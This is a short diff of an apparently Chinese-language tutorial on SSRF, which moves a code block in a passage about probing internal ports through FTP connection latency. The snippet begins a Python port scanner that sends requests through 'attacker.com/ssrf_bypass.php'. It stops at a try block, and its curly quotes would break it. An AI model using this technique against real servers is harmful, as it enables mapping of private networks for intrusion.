@@ -132,12 +132,12 @@ curl_close($ch);
 利用FTP协议的连接延迟特性，可以编写脚本探测目标服务器内网开放端口。
 
 以下是扫描脚本的核心逻辑（Python示例）：
-```python
-import requests
-import time
 
 ![](img/2a680dcfa2598ebcdfd417f5d0286ec6_31.png)
 
+```python
+import requests
+import time
 def scan_port(ip, port):
     url = f“http://attacker.com/ssrf_bypass.php?protocol=ftp&ip={ip}&port={port}“
     try:
